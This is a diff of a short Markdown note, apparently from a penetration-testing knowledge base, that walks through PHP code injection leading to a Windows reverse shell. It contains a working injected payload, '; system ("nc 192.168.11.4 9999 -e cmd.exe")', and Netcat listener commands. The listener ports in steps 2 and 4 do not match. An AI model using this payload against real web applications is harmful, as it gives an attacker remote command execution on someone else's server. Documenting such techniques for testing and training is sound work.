@@ -34,11 +34,31 @@ PHP code injection allows an attacker to execute code through input fields.
 
 PHP code injection allows an attacker to execute code through input fields.
 
+
+
 # Instructions
+
+
+
+
 
 1. Identify code injection by passing PHP function through input fields. In the below screenshot, the application responded for *phpinfo()* function with the PHP version.
 
+
+
+
+
+![c124626a-3c12-4db5-81ca-9e61556c9a46.PNG](_assets/images/Mash/c124626a-3c12-4db5-81ca-9e61556c9a46.PNG)
+
+
+
 2. To get a reverse shell connection, setup a listener on the remote machine using *Netcat* command as shown below.
+
+
+
+
+
+
 
 **Command** ([[Netcat windows in listening mode on port 80]]):
 
@@ -46,7 +66,25 @@ PHP code injection allows an attacker to execute code through input fields.
 nc.exe -nlvp 80
 ```
 
+
+
+
+
+
+
+
+
+
+
+
+
 3. Insert the below payload through input field to execute *Netcat* command and connect to the remote listener.
+
+
+
+
+
+
 
 **Command** ([[Netcat command to establish connection with listener]]):
 
@@ -54,13 +92,45 @@ nc.exe -nlvp 80
 ; system ("nc 192.168.11.4 9999 -e cmd.exe")
 ```
 
+
+
+
+
+
+
+
+
+![bf693b99-888c-4ae7-a26e-2fdc604eb0ce.PNG](_assets/images/Mash/bf693b99-888c-4ae7-a26e-2fdc604eb0ce.PNG)
+
+
+
+
+
 4. The payload is executed and shell is received at the listener.
+
+
+
+
+
+
+
+
+
+
 
 **Command** ([[Netcat windows reverse shell is observed]]):
 
 ```bash
 nc.exe -lvp 9999 
 ```
+
+
+
+
+
+
+
+
 
 ## Platforms
 
@@ -79,3 +149,5 @@ nc.exe -lvp 9999
 - [[owasp top 10]]
 - [[Reverse Shell]]
 - [[Web Applications]]
+
+
